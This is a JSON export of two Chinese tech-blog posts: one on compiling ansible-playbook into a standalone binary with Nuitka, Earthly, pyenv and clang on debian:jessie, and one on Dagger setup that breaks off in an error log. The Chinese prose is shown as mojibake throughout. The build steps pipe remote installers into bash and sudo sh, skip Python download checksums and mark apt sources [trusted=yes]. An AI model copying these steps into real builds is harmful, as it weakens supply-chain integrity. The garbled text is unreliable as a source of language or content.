[{"content":"ansible-playbook ç‹¬ç«‹äºŒè¿›åˆ¶ç¼–è¯‘å®å½• èƒŒæ™¯/èµ·å›  å†…éƒ¨äº§å“æ¶‰åŠåˆ°å¾ˆå¤š docker é•œåƒï¼Œåˆ†å¸ƒå¼å®‰è£…æ¶‰åŠå¾ˆå¤šä¸»æœºï¼Œæ‰€ä»¥é‡‡ç”¨äº† ansible æ¥ç¼–å†™éƒ¨ç½²è„šæœ¬ï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¼šå› ä¸ºéƒ¨ç½²æœºå™¨çš„ç³»ç»Ÿæˆ–å®‰è£…çš„ ansible ç‰ˆæœ¬ä¸åŒï¼Œæ€»æ˜¯ä¼šæœ‰å„ç§å„æ ·çš„é—®é¢˜ã€‚\næœ€å¼€å§‹è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ¡ˆæ˜¯æ„å»ºäº†ä¸€ä¸ªå®‰è£…äº† ansible çš„ alpine é•œåƒï¼Œç„¶åè®©ç”¨æˆ·å¯¼å…¥é•œåƒå†æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤æ¥è¿›è¡Œå®‰è£…ã€‚\nä½†æ˜¯æˆ‘ä»¬ä¸ºäº†ä¿è¯ docker ç‰ˆæœ¬ä¸ä¸€è‡´å¯¼è‡´çš„å®‰è£…é—®é¢˜ï¼Œæˆ‘ä»¬åœ¨ ansible è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šæ¸…ç©ºå¸è½½ç›®æ ‡ä¸»æœºä¸Šçš„ dockerï¼Œç„¶åç”¨æˆ‘ä»¬çš„æ–¹æ¡ˆé‡è£…ï¼Œè¿™å°±å¯¼è‡´äº†æ‰§è¡Œå®‰è£…å‘½ä»¤çš„æœºå™¨ä¸èƒ½ä½œä¸ºç›®æ ‡ä¸»æœºè¿›è¡Œéƒ¨ç½²ï¼Œéœ€è¦ä¸€å°é¢å¤–çš„ä¸»æœºï¼ˆå› ä¸ºæˆ‘ä»¬æ˜¯ä¾é  docker å®¹å™¨å†…éƒ¨çš„ ansible-playbook æ¥æ‰§è¡Œçš„ï¼Œæ¸…ç©ºå¸è½½ docker æœåŠ¡è¿™ä¸ªåŠ¨ä½œä¼šé€ æˆ ansible-playbook åœæ­¢æ‰§è¡Œï¼‰ã€‚\næ‰€ä»¥è‡ªç„¶è€Œç„¶å°±æƒ³åˆ°ï¼šèƒ½ä¸èƒ½åƒ Golang ä¸€æ ·ç¼–è¯‘ä¸€ä¸ª ansible-playbook çš„ç‹¬ç«‹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™æ ·å°±è§£å†³è¿™ä¸ªé—®é¢˜äº†ã€‚\nå½“ç„¶ï¼Œä¹Ÿæœ‰åƒ Pulumi è¿™æ ·çš„æ–¹æ¡ˆï¼Œèƒ½å¤Ÿä½¿ç”¨ Golang ä»£ç æ¥å®šä¹‰æ‰§è¡Œè¿‡ç¨‹ï¼Œç›®å‰æœ¬äººè¿˜æ²¡è°ƒç ”è¿‡æ˜¯å¦èƒ½æ–¹ä¾¿ç¼–è¯‘å‡ºäºŒè¿›åˆ¶è¿è¡Œã€‚ä¸è¿‡éƒ¨ç½²è„šæœ¬å·²ç»ä½¿ç”¨ ansible äº†ï¼Œä¸ºäº†æˆæœ¬æœ€å°ï¼Œè¿˜æ˜¯ç»§ç»­èƒ½æ²¿ç”¨ ansible æœ€ä½³ã€‚\næ–¹æ¡ˆè°ƒç ” ansible æ˜¯ä¸€ä¸ª Python å†™çš„å·¥å…·ã€‚\nPython å·¥å…·ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶å¤§è‡´æœ‰è¿™å‡ ç§æ–¹æ¡ˆï¼š\npyinstaller Nuitka cx_Freeze py2exe PyOxidizer æˆªæ­¢åˆ°æˆ‘å½“æ—¶å¤„ç†è¿™ä¸ªé—®é¢˜æ—¶ï¼ŒPyOxidizer è¿˜å¹¶ä¸æˆç†Ÿï¼Œæ‰€ä»¥çœ‹äº†ä¸‹ Nuitkaï¼Œæ˜¯ pyinstaller ä¹‹åå‡ºæ¥çš„æ›´ç°ä»£çš„æ–¹æ¡ˆï¼Œæ‰€ä»¥å†³å®šé€‰ç”¨è¿™ä¸ªã€‚\nç¼–è¯‘ç¯å¢ƒæ–¹é¢çš„é—®é¢˜ï¼Œæ‰“ç®—ä½¿ç”¨ Docker è¿›è¡Œè§£å†³ï¼Œæ°å¥½ç”¨è¿‡ Earthlyï¼Œå¯ä»¥åœ¨ Docker ç¯å¢ƒä¸­ç¼–è¯‘å¥½åå¯¼å‡ºæ–‡ä»¶ï¼Œæ‰€ä»¥ç”¨è¿™ä¸ª\nç‰›åˆ€å°è¯• æˆ‘é¦–å…ˆå°è¯•ä½¿ç”¨ Python çš„å®˜æ–¹é•œåƒåšæ‰“åŒ…\næœç´¢åˆ°äº†ä¸€ä¸ªäººæœ‰åšè¿‡ç›¸å…³çš„ Ansika/Dockerfile at main Â· HexmosTech/Ansika\nç»“åˆè¿™ä¸ª Dockerfileï¼ŒåŠ ä¸Šè‡ªå·±çš„è°ƒç ”æµ‹è¯•ï¼Œå¾—å‡ºå¦‚ä¸‹ Earthfileâ€‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 VERSION 0.8 FROM python:3.9-slim-bullseye WORKDIR /workdir deps: RUN sed -i \u0026#34;s|http://deb.debian.org/debian|http://mirror.sjtu.edu.cn/debian|g\u0026#34; /etc/apt/sources.list \\ \u0026amp;\u0026amp; apt-get update -y # å®‰è£… ansile 7 RUN python3.9 -m pip install ansible==7.7.0 -i https://mirror.sjtu.edu.cn/pypi/web/simple # å®‰è£… nuitka åŠå…¶ä¾èµ– RUN apt-get install --no-install-recommends -y \\ python3.9-dev \\ build-essential \\ patchelf \\ ccache \\ clang \\ libfuse-dev \\ upx \\ \u0026amp;\u0026amp; python3.9 -m pip install nuitka==2.1.3 -i https://mirror.sjtu.edu.cn/pypi/web/simple build: FROM +deps RUN python3.9 -m nuitka \\ --onefile \\ --clang \\ --include-package=pty \\ --include-package=xml \\ --include-package-data=ansible:\u0026#39;*.py\u0026#39; \\ --include-package-data=ansible:\u0026#39;*.yml\u0026#39; \\ /usr/local/bin/ansible-playbook SAVE ARTIFACT ansible-playbook.bin AS LOCAL ansible-playbook.bin æ‰§è¡Œ earthly +buildâ€‹ å³å¯ç¼–è¯‘å¯¼å‡ºã€‚\nä½†æ˜¯è¿™ä¸ªæ–¹æ¡ˆä¾èµ– GLIBCï¼Œå¹¶ä¸”å› ä¸ºåŸºç¡€é•œåƒæ˜¯ debian bullseyeï¼Œæ‰€ä»¥è¿è¡Œç¯å¢ƒéœ€æ±‚ GLIBC_2.29ï¼Œç»æµ‹è¯•éœ€è¦ ubuntu 22 ä»¥ä¸Šæ‰å¯ä»¥ä½¿ç”¨ã€‚\nè¿™ä¸ªç¯å¢ƒè¦æ±‚å¤ªè‹›åˆ»äº†ï¼Œå¾ˆå¤šä¼ä¸šå†…éƒ¨çš„ç¯å¢ƒéƒ½è¾¾ä¸åˆ°ã€‚\né™æ€ç¼–è¯‘ï¼Ÿ Golang ç¼–è¯‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ alpine + musl çš„æ‰‹æ®µï¼Œæ„å»ºå‡ºä¸€ä¸ªæ— ä¾èµ–çš„é™æ€å¯æ‰§è¡Œæ–‡ä»¶ã€‚é‚£è¿™ä¸ªå¯ä»¥å—ï¼Ÿ\nç»è¿‡æˆ‘çš„ä¸€ç•ªè°ƒç ”ï¼Œç­”æ¡ˆæ˜¯åŸºæœ¬èµ°ä¸é€šï¼ŒåŸå› æ˜¯ python æœ‰äº›åº“é‡Œé¢æ˜¯ä½¿ç”¨ ctypes è°ƒç”¨äº†åŠ¨æ€é“¾æ¥åº“ï¼Œå¦‚æœæ”¹ç”¨ musl ç¼–è¯‘ï¼Œåˆ™æ ¹æœ¬è¿è¡Œä¸äº†ã€‚\nåç»­ä¼šæä¾›æˆ‘ Nuitka + musl é™æ€ç¼–è¯‘çš„æ„å»ºå°è¯•ç»å†ã€‚\né™ä½ GLIBC è¦æ±‚ï¼Ÿ Nuitka å®˜æ–¹å¯¹äºé™æ€ç¼–è¯‘çš„ issue æœ‰åšè¿‡ä¸€äº›å›åº”ï¼Œå®˜æ–¹ç»™å‡ºçš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨ä»–ä»¬ä»˜è´¹è®¡åˆ’ä¸­æä¾›çš„ä¸€ä¸ªä½ç‰ˆæœ¬ GLIBC ä¾èµ–çš„é•œåƒæ¥ç¼–è¯‘ã€‚\nè¿™ç»™äº†æˆ‘çµæ„Ÿï¼Œæˆ‘ä¹Ÿå¯ä»¥ä½¿ç”¨ä½ç‰ˆæœ¬é•œåƒï¼Œç„¶åè¿›è¡Œç¼–è¯‘ã€‚\næ­¥å…¥æ­£è½¨ è¿™æ—¶æ‰ç®—èµ°ä¸Šæ¯”è¾ƒå¯è¡Œçš„æ–¹æ¡ˆã€‚\nç»è¿‡å°è¯•ï¼Œæˆ‘é€‰ç”¨äº† debian:jessie-slimâ€‹ ä½œä¸ºåŸºç¡€é•œåƒã€‚\nå‡†å¤‡ Python ç¯å¢ƒ ä½†æ˜¯æˆ‘ä»¬éœ€è¦å®‰è£…ä¸€ä¸ª python ç¯å¢ƒæ¥ç¼–è¯‘ï¼Œjessie å®˜æ–¹æºé‡Œé¢çš„é•œåƒå®åœ¨å¤ªä½äº†ã€‚\nè¿™æ—¶æˆ‘æƒ³åˆ°äº†ä¹‹å‰ç ”ç©¶è¿‡ Rye è¿™ä¸ª uv ç”Ÿæ€ä¸­çš„å·¥å…·ï¼Œé‡Œé¢å¯ä»¥éšæ—¶å®‰è£… python ç‰ˆæœ¬ï¼Œåœ¨æºç ä¸­èƒ½çœ‹åˆ°è¯¥å·¥å…·ä½¿ç”¨çš„æ˜¯ Releases Â· indygreg/python-build-standalone è¿™ä¸ªé¢„æ‰“åŒ…å¥½çš„ python ç¯å¢ƒã€‚\nå°è¯•å®‰è£…ç¼–è¯‘ï¼Œä½†æ˜¯ä½¿ç”¨ Nuitka ç¼–è¯‘æ—¶æ€»ä¼šæŠ¥ gcc ç›¸å…³çš„é”™è¯¯ã€‚\nç»è¿‡ä¸€ç•ªè°ƒç ”ï¼Œåº”è¯¥æ˜¯ python-build-standalone ç”¨çš„åŸºç¡€ç¼–è¯‘ç³»ç»Ÿ GLIBC ç‰ˆæœ¬è¾ƒé«˜ï¼Œdebian:jessieâ€‹ ä¸Šèƒ½å®‰è£…çš„ gcc æœ€é«˜ç‰ˆæœ¬å’Œè¿™ä¸ªæ— æ³•è¿›è¡Œç¬¦å·é“¾æ¥ã€‚\næ‰€ä»¥å†³å®šè‡ªè¡Œä»æºç æ„å»º pythonã€‚\nçœ‹äº†ä¸‹ python çš„å®˜æ–¹æ–‡æ¡£å…³äºè‡ªè¡Œç¼–è¯‘çš„æ–‡æ¡£ï¼Œæ¯”è¾ƒå¤æ‚ï¼Œè¿˜æ˜¯æ‰¾æ‰¾æœ‰æ²¡æœ‰ç°æˆçš„ã€‚\né¦–å…ˆæˆ‘å°è¯•äº†è¿™ä¸ªä»“åº“ python-cmake-buildsystem/python-cmake-buildsystemï¼šç”¨äºç¼–è¯‘ Python çš„ cmake æ„å»ºç³»ç»Ÿ \u0026mdash; python-cmake-buildsystem/python-cmake-buildsystem: A cmake buildsystem for compiling Python\nä½†æ˜¯è¯¥ä»“åº“ä¾èµ–çš„ cmake ç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼Œè€Œ debian:jessieâ€‹ ä¸æ»¡è¶³ï¼Œç„¶åå‡çº§ cmake åˆæ¶‰åŠåˆ°å‡çº§ glibcï¼Œæ­»å¾ªç¯äº†ã€‚\næ²¡æœ‰å…¶ä»–æ¯”è¾ƒç®€å•çš„æ–¹æ¡ˆäº†å—ï¼Ÿ\næƒ³åˆ°è¿˜æœ‰ä¸ªæ¯”è¾ƒå‡ºåçš„å·¥å…·æ˜¯ pyenvï¼Œæˆ‘å»çœ‹äº†çœ‹å·¥å…·æºç ï¼Œè¿™ä¸ªå·¥å…·å±…ç„¶æ˜¯ä» python æºç ç¼–è¯‘çš„ï¼Œè¯•ä¸€è¯•ã€‚\npython å®‰è£…æ²¡é—®é¢˜ã€‚\nNuitka ç¼–è¯‘ helloworld æ ·ä¾‹ï¼Œå‡ºç°é—®é¢˜äº†ã€‚\npyenv é»˜è®¤é‡‡ç”¨ gcc ç¼–è¯‘pythonï¼Œè€Œ nuitka ä¼šæ£€æµ‹åˆ° gcc ç‰ˆæœ¬è¿‡ä½ï¼Œä¸æ”¯æŒ c11ï¼Œè½¬ç”¨ g++ï¼Œå¯¼è‡´ä¸¤è¾¹ç¬¦å·ä¸å¯¹ï¼Œnuitka æ— æ³•ç¼–è¯‘ï¼ˆæˆ‘çŒœçš„ï¼‰\né‚£æˆ‘ä»¬æ”¹ç”¨ clang è¯•è¯•ï¼Œclang å°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜äº†ï¼Œä»€ä¹ˆç‰ˆæœ¬éƒ½èƒ½ç”¨ï¼Œéƒ½æ”¯æŒ c11ã€‚\nç»è¿‡æµ‹è¯•ï¼ŒNuitka ç¼–è¯‘æµ‹è¯•é€šè¿‡\næ‰€ä»¥æ•²å®š pyenv çš„æ–¹æ¡ˆã€‚\næœ€ç»ˆæ–¹æ¡ˆ å› ä¸ºç›®å‰äº§å“ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ python 3.9ï¼Œæ‰€ä»¥ä¸ºäº†ä¿æŒä¸€è‡´ï¼Œè¿˜æ˜¯ä½¿ç”¨ pyenv å®‰è£…äº† 3.9\nè‡³äºä¾èµ–åŒ…ä¸ºä»€ä¹ˆç”¨è¿™äº›ï¼Œæˆ‘ä¹Ÿæ˜¯ä¸€ç‚¹ç‚¹æ ¹æ®æŠ¥é”™æ‰£å‡ºæ¥çš„ã€‚\næ ¹æ®ä¸Šé¢çš„ç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ç»™å‡ºä¸€ä¸ª Earthfileâ€‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 VERSION 0.8 FROM debian:jessie-slim WORKDIR /workdir deps: ENV PYTHON_BUILD_MIRROR_URL_SKIP_CHECKSUM=1 ENV PYTHON_BUILD_MIRROR_URL=\u0026#34;https://registry.npmmirror.com/-/binary/python\u0026#34; ENV PATH=\u0026#34;/root/.pyenv/bin:$PATH\u0026#34; RUN \\ # å†™å…¥é•œåƒæº echo \u0026#39;deb [trusted=yes] http://mirrors.aliyun.com/debian-archive/debian jessie main\u0026#39; \u0026gt; /etc/apt/sources.list \\ \u0026amp;\u0026amp; echo \u0026#39;deb [trusted=yes] http://mirrors.aliyun.com/debian-archive/debian-security jessie/updates main\u0026#39; \u0026gt;\u0026gt; /etc/apt/sources.list \\ \u0026amp;\u0026amp; echo \u0026#39;deb-src [trusted=yes] http://mirrors.aliyun.com/debian-archive/debian jessie main\u0026#39; \u0026gt;\u0026gt; /etc/apt/sources.list \\ \u0026amp;\u0026amp; echo \u0026#39;deb-src [trusted=yes] http://mirrors.aliyun.com/debian-archive/debian-security jessie/updates main\u0026#39; \u0026gt;\u0026gt; /etc/apt/sources.list \\ \u0026amp;\u0026amp; echo \u0026#39;deb [trusted=yes] http://mirrors.aliyun.com/debian-archive/debian jessie-backports main\u0026#39; \u0026gt; /etc/apt/sources.list.d/backports.list \\ \u0026amp;\u0026amp; echo \u0026#39;deb-src [trusted=yes] http://mirrors.aliyun.com/debian-archive/debian jessie-backports main\u0026#39; \u0026gt;\u0026gt; /etc/apt/sources.list.d/backports.list \\ \u0026amp;\u0026amp; echo \u0026#39;deb [trusted=yes] http://mirrors.aliyun.com/debian-archive/debian jessie-backports-sloppy main\u0026#39; \u0026gt; /etc/apt/sources.list.d/backports-sloppy.list \\ \u0026amp;\u0026amp; echo \u0026#39;deb-src [trusted=yes] http://mirrors.aliyun.com/debian-archive/debian jessie-backports-sloppy main\u0026#39; \u0026gt;\u0026gt; /etc/apt/sources.list.d/backports-sloppy.list \\ \u0026amp;\u0026amp; apt-get update \\ # æ„å»ºpythonéœ€è¦çš„è£…å¤‡ # å‚è€ƒ https://github.com/pyenv/pyenv/issues/2426#issuecomment-1200430855 \u0026amp;\u0026amp; apt-get build-dep -y python3 \\ # https://github.com/pyenv/pyenv/wiki/Common-build-problems#2-your-openssl-version-is-incompatible-with-the-python-version-youre-trying-to-install \u0026amp;\u0026amp; apt-get -t jessie-backports install -y openssl \\ \u0026amp;\u0026amp; apt-get install --no-install-recommends -y \\ ca-certificates \\ patchelf \\ ccache \\ curl \\ git \\ # æ„å»ºpythonéœ€è¦çš„è£…å¤‡ # ä½¿ç”¨ clang æ˜¯å› ä¸º gcc ç‰ˆæœ¬è¿‡ä½ # pyenv é»˜è®¤é‡‡ç”¨ gcc ç¼–è¯‘pythonï¼Œè€Œ nuitka ä¼šæ£€æµ‹åˆ° gcc ç‰ˆæœ¬è¿‡ä½ï¼Œä¸æ”¯æŒ c11ï¼Œè½¬ç”¨ g++ï¼Œå¯¼è‡´ä¸¤è¾¹ç¬¦å·ä¸å¯¹ï¼Œnuitka æ— æ³•ç¼–è¯‘ï¼ˆæˆ‘çŒœçš„ï¼‰ # è€Œ clang å°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜äº†ï¼Œä»€ä¹ˆç‰ˆæœ¬éƒ½èƒ½ç”¨ï¼Œéƒ½æ”¯æŒ c11 # å‚è§ https://nuitka.net/doc/user-manual.html#c-compiler clang \\ build-essential \\ gdb \\ lcov \\ pkg-config \\ libbz2-dev \\ libffi-dev \\ libgdbm-dev \\ liblzma-dev \\ libncurses5-dev \\ libreadline6-dev \\ libsqlite3-dev \\ libssl-dev \\ lzma \\ lzma-dev \\ tk-dev \\ uuid-dev \\ zlib1g-dev # ä»æºç æ„å»ºå®‰è£… python 3.9.19 RUN curl -L https://raw.githubusercontent.com/yyuu/pyenv-installer/master/bin/pyenv-installer | bash RUN eval \u0026#34;$(pyenv init -)\u0026#34; RUN PYTHON_CONFIGURE_OPTS=\u0026#34;--enable-shared\u0026#34; CXX=\u0026#34;clang++\u0026#34; CC=\u0026#34;clang\u0026#34; pyenv install 3.9.19 \\ \u0026amp;\u0026amp; pyenv global 3.9.19 build: FROM +deps RUN /root/.pyenv/versions/3.9.19/bin/python -m pip install --force-reinstall ansible==7.7.0 nuitka==2.1.3 -i https://mirror.sjtu.edu.cn/pypi/web/simple # æ­¤å¤„ç¼–è¯‘çš„æ—¶å€™ä¸èƒ½å†è®¾ç½® CXX=\u0026#34;clang++\u0026#34; CC=\u0026#34;clang\u0026#34;ï¼Œå¦åˆ™ä¼šå‡ºç°ä¸‹é¢çš„é”™è¯¯ # TypeError: \u0026#39;NoneType\u0026#39; object is not iterable: # File \u0026#34;/root/.pyenv/versions/3.9.19/lib/python3.9/site-packages/nuitka/build/Onefile.scons\u0026#34;, line 314: # reportCCompiler(env, \u0026#34;Onefile\u0026#34;, output_func=scons_logger.info) # File \u0026#34;/root/.pyenv/versions/3.9.19/lib/python3.9/site-packages/nuitka/build/SconsCompilerSettings.py\u0026#34;, line 971: # \u0026#34;.\u0026#34;.join(str(d) for d in env.gcc_version), # FATAL: Error, onefile bootstrap binary build failed. # æ— æ³•åˆ›å»º onefile RUN /root/.pyenv/versions/3.9.19/bin/python -m nuitka \\ --clang \\ --onefile \\ --include-package=pty \\ --include-package=xml \\ --include-package-data=ansible:\u0026#39;*.py\u0026#39; \\ --include-package-data=ansible:\u0026#39;*.yml\u0026#39; \\ /root/.pyenv/versions/3.9.19/bin/ansible-playbook SAVE ARTIFACT ansible-playbook.bin AS LOCAL ansible-playbook.bin æ‰§è¡Œ earthly +buildâ€‹ å³å¯ç¼–è¯‘ï¼Œç»è¿‡æµ‹è¯•ï¼Œè¯¥ç‰ˆæœ¬çš„ ansible-playbook.bin ç”šè‡³èƒ½åœ¨ Ubuntu 14 ä¸Šä½¿ç”¨\nè‡³äºå…¶ä»–è¸©çš„å‘ï¼Œä»æˆ‘ä¸Šé¢è¿™äº›ä»£ç çš„æ³¨é‡Šä¸­ä¹Ÿèƒ½çœ‹å‡ºæ¥ã€‚\n","permalink":"https://www.hacktech.cn/post/ansibleplaybook-independent-binary-compilation-actual-record-2f3tyf.html","summary":"\u003ch1 id=\"ansible-playbook-ç‹¬ç«‹äºŒè¿›åˆ¶ç¼–è¯‘å®å½•\"\u003eansible-playbook ç‹¬ç«‹äºŒè¿›åˆ¶ç¼–è¯‘å®å½•\u003c/h1\u003e\n\u003ch2 id=\"èƒŒæ™¯èµ·å› \"\u003eèƒŒæ™¯/èµ·å› \u003c/h2\u003e\n\u003cp\u003eå†…éƒ¨äº§å“æ¶‰åŠåˆ°å¾ˆå¤š docker é•œåƒï¼Œåˆ†å¸ƒå¼å®‰è£…æ¶‰åŠå¾ˆå¤šä¸»æœºï¼Œæ‰€ä»¥é‡‡ç”¨äº† ansible æ¥ç¼–å†™éƒ¨ç½²è„šæœ¬ï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¼šå› ä¸ºéƒ¨ç½²æœºå™¨çš„ç³»ç»Ÿæˆ–å®‰è£…çš„ ansible ç‰ˆæœ¬ä¸åŒï¼Œæ€»æ˜¯ä¼šæœ‰å„ç§å„æ ·çš„é—®é¢˜ã€‚\u003c/p\u003e","title":"ansible-playbook ç‹¬ç«‹äºŒè¿›åˆ¶ç¼–è¯‘å®å½•"},{"content":"Dagger ä½¿ç”¨æœ­è®° å·¥å…·ä»‹ç» ç”¨äºæ„å»º DevOps å·¥ä½œæµçš„å¼€æºå¹³å°ï¼Œæ—¨åœ¨ç®€åŒ–å’Œæ ‡å‡†åŒ–å¤æ‚çš„ CI/CD ç®¡é“ã€‚\nDagger æä¾›äº† Go/Python/TypeScript ç­‰è¯­è¨€çš„ sdkï¼Œä½¿ä½ èƒ½ä½¿ç”¨è¿™äº›è¯­è¨€æ¥æ“ä½œ BuildKit æ¥ç”Ÿæˆæˆ–æ¨é€ä½ æƒ³è¦çš„æ–‡ä»¶æˆ–é•œåƒ\nç”¨æ³• ä»¥ä¸‹çš„å®‰è£…å’Œåˆå§‹åŒ–ç»™å‡ºäº†å›½å†…ç½‘ç»œç¯å¢ƒä¸‹çš„ä½¿ç”¨\nå®‰è£… å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œé¦–å…ˆå°±æ˜¯éœ€è¦ä¸‹è½½ä½¿ç”¨\né¦–å…ˆå¯ä»¥æŒ‰ç…§å®˜ç½‘ Installation | Dagger æ¥è¿›è¡Œå®‰è£…\n1 curl -fsSL https://dl.dagger.io/dagger/install.sh | BIN_DIR=/usr/local/bin sudo -E sh åˆå§‹åŒ– æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯¹æˆ‘ä»¬å·²æœ‰çš„é¡¹ç›®è¿›è¡Œåˆå§‹åŒ–\n1 dagger init --sdk=go --source=./dagger ä½†æ˜¯ä½ å¯èƒ½ä¼šç¢°åˆ°å¦‚ä¸‹é”™è¯¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 âœ˜ connect 17.0s ! start engine: failed to pull image: failed to run command: exit status 1 âœ˜ starting engine 17.0s ! failed to pull image: failed to run command: exit status 1 âœ˜ create 17.0s ! failed to pull image: failed to run command: exit status 1 âœ” exec docker ps -a --no-trunc --filter name=^/dagger-engine- --format {{.Names}} 0.3s âœ˜ exec docker inspect --type=image registry.dagger.io/engine:v0.13.7 0.0s ! failed to run command: exit status 1 â”ƒ [] â”ƒ Error response from daemon: No such image: registry.dagger.io/engine:v0.13.7 âœ˜ exec docker pull registry.dagger.io/engine:v0.13.7 16.7s ! failed to run command: exit status 1 â”ƒ Error response from daemon: Get \u0026#34;https://registry.dagger.io/v2/\u0026#34;: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers) Error: start engine: failed to pull image: failed to run command: exit status 1 é”™è¯¯æç¤ºæˆ‘ä»¬æ‹‰å–ä¸åˆ°é•œåƒï¼Œå¾ˆæ˜æ˜¾æ˜¯ç½‘ç»œé—®é¢˜\næ ¹æ®ä»¥ä¸‹é“¾æ¥\nè®°å½•å¦‚ä½•åœ¨ç§æœ‰ Intranet ä¸­è¿è¡Œ dagger Â· é—®é¢˜ #6275 Â· dagger/dagger \u0026mdash; Document how to run dagger in a private intranet Â· Issue #6275 Â· dagger/dagger ç¼ºå°‘æœ‰å…³å¦‚ä½•åœ¨å…¬å¸ä»£ç†åé¢ä½¿ç”¨ dagger çš„æ–‡æ¡£ Â· é—®é¢˜ #5240 Â· dagger/dagger \u0026mdash; Missing documentation on how to use dagger behind a corporate proxy Â· Issue #5240 Â· dagger/dagger æ”¯æŒæœ¬åœ°è°ƒè¯•è¿œç¨‹å¼•æ“Â·é—®é¢˜#25852Â·airbytehq/airbyte \u0026mdash; Support for debugging remote engines locally Â· Issue #25852 Â· airbytehq/airbyte æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼ˆæ–‡æ¡£å‚è§ Custom Runner | Daggerï¼‰\n1 2 export _EXPERIMENTAL_DAGGER_RUNNER_HOST=docker-image://ghcr.nju.edu.cn/dagger/engine:v0.13.7 dagger init --sdk=go --source=./dagger ä½†å¯èƒ½è¿˜æ˜¯ä¼šæŠ¥é”™\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 âœ” connect 7m19.9s âœ” cache request: mkfile /schema.json 0.0s âœ” mkfile /schema.json 0.1s âœ” cache request: blob://sha256:ccfd910d90eb8e37ae8d9131e99f63cec19c582e841db89062a05342514c2165 0.0s âœ” blob://sha256:ccfd910d90eb8e37ae8d9131e99f63cec19c582e841db89062a05342514c2165 0.0s âœ” moduleSource(refString: \u0026#34;.\u0026#34;): ModuleSource! 0.0s âœ” ModuleSource.kind: ModuleSourceKind! 0.0s âœ” ModuleSource.resolveContextPathFromCaller: String! 0.0s âœ” ModuleSource.withName(name: \u0026#34;z_deploy\u0026#34;): ModuleSource! 0.0s âœ” ModuleSource.withSDK(sdk: \u0026#34;go\u0026#34;): ModuleSource! 0.0s âœ” ModuleSource.withInit: ModuleSource! 0.0s âœ” ModuleSource.withSourceSubpath(path: \u0026#34;dagger\u0026#34;): ModuleSource! 0.0s âœ” ModuleSource.resolveFromCaller: ModuleSource! 0.2s âœ˜ ModuleSource.asModule(engineVersion: \u0026#34;latest\u0026#34;): Module! 45.2s ! failed to create module: select: failed to update codegen and runtime: failed to generate code: failed to get modified source directory for go module sdk codegen: select: process \u0026#34;codegen --output /src --module-context-path /src/z_deploy/dagger --module-name z_deploy --introspection-json-path /schema.json --merge=false\u0026#34; did not complete successfully: exit code: 1 Error: failed to generate code: input: moduleSource.withContextDirectory.withName.withSDK.withSourceSubpath.withInit.asModule resolve: failed to create module: select: failed to update codegen and runtime: failed to generate code: failed to get modified source directory for go module sdk codegen: select: process \u0026#34;codegen --output /src --module-context-path /src/z_deploy/dagger --module-name z_deploy --introspection-json-path /schema.json --merge=false\u0026#34; did not complete successfully: exit code: 1 Stdout: generating go module: z_deploy creating directory . [skipped] creating directory z_deploy [skipped] creating directory z_deploy/dagger [skipped] writing z_deploy/dagger/dagger.gen.go writing z_deploy/dagger/go.mod writing z_deploy/dagger/go.sum creating directory z_deploy/dagger/internal creating directory z_deploy/dagger/internal/dagger writing z_deploy/dagger/internal/dagger/dagger.gen.go creating directory z_deploy/dagger/internal/querybuilder writing z_deploy/dagger/internal/querybuilder/marshal.go writing z_deploy/dagger/internal/querybuilder/querybuilder.go creating directory z_deploy/dagger/internal/telemetry writing z_deploy/dagger/internal/telemetry/attrs.go writing z_deploy/dagger/internal/telemetry/env.go writing z_deploy/dagger/internal/telemetry/exporters.go writing z_deploy/dagger/internal/telemetry/init.go writing z_deploy/dagger/internal/telemetry/live.go writing z_deploy/dagger/internal/telemetry/logging.go writing z_deploy/dagger/internal/telemetry/metrics.go writing z_deploy/dagger/internal/telemetry/proxy.go writing z_deploy/dagger/internal/telemetry/span.go writing z_deploy/dagger/internal/telemetry/transform.go writing z_deploy/dagger/main.go creating directory z_deploy/dagger/internal [skipped] creating directory z_deploy/dagger/internal/dagger [skipped] writing z_deploy/dagger/internal/dagger/dagger.gen.go [skipped] creating directory z_deploy/dagger/internal/querybuilder [skipped] writing z_deploy/dagger/internal/querybuilder/marshal.go [skipped] writing z_deploy/dagger/internal/querybuilder/querybuilder.go [skipped] creating directory z_deploy/dagger/internal/telemetry [skipped] writing z_deploy/dagger/internal/telemetry/attrs.go [skipped] writing z_deploy/dagger/internal/telemetry/env.go [skipped] writing z_deploy/dagger/internal/telemetry/exporters.go [skipped] writing z_deploy/dagger/internal/telemetry/init.go [skipped] writing z_deploy/dagger/internal/telemetry/live.go [skipped] writing z_deploy/dagger/internal/telemetry/logging.go [skipped] writing z_deploy/dagger/internal/telemetry/metrics.go [skipped] writing z_deploy/dagger/internal/telemetry/proxy.go [skipped] writing 